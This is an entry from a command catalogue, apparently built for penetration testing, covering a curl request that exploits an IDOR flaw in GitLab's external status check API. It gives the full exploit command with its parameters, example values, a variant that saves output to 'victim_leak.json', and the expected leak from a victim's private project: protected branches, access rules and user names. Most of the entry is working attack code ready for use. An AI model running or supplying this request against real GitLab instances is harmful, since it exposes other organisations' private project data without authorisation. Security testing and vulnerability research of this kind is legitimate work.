---
id: g7h8i9j0-k1l2-3456-ghij-789012345678
data: |-
  curl --request POST \
    --url 'https://gitlab.domain.com/api/v4/projects/<ATTACKID>/merge_requests/1/status_check_responses?sha=<SHA>&external_status_check_id=1' \
    --header 'Authorization: Bearer <TOKEN>'
tags:
  - api
  - gitlab
  - idor
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:32:20.662Z'
verified: false
validated: true
submitted: true
---
# curl-gitlab-status-check-victim

## Command

```bash
curl --request POST \
  --url 'https://gitlab.domain.com/api/v4/projects/<ATTACKID>/merge_requests/1/status_check_responses?sha=<SHA>&external_status_check_id=1' \
  --header 'Authorization: Bearer <TOKEN>'
```

## Description

This command exploits the IDOR by using the victim's status check ID (1) in the API request, leaking sensitive data from the private victim project despite lacking direct access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--url` | API endpoint with ATTACKID, correct sha=<SHA>, and external_status_check_id=1 (victim's ID) | Yes |
| `--header 'Authorization: Bearer <TOKEN>'` | Token for authentication | Yes |
| `<ATTACKID>` | Attacker's project ID | Yes |
| `<SHA>` | Valid SHA | Yes |
| `<TOKEN>` | Access token | Yes |

## Examples

### Basic Usage

```bash
curl --request POST \
  --url 'https://gitlab.domain.com/api/v4/projects/123/merge_requests/1/status_check_responses?sha=abcdef123&external_status_check_id=1' \
  --header 'Authorization: Bearer glpat-abc123'
```

### Advanced Usage

Save output to file for analysis:

```bash
curl --request POST \
  --url 'https://gitlab.domain.com/api/v4/projects/<ATTACKID>/merge_requests/1/status_check_responses?sha=<SHA>&external_status_check_id=1' \
  --header 'Authorization: Bearer <TOKEN>' > victim_leak.json
```

## Expected Output

JSON response including merge request info but with external_status_check details from the victim's project: project ID/name, status check name, external URL, protected branch names/IDs, and access rules with user names.

## Related

- [[commands/curl-gitlab-status-check-own]]
- [[procedures/Exploit-IDOR-in-GitLab-Status-Check-API]]
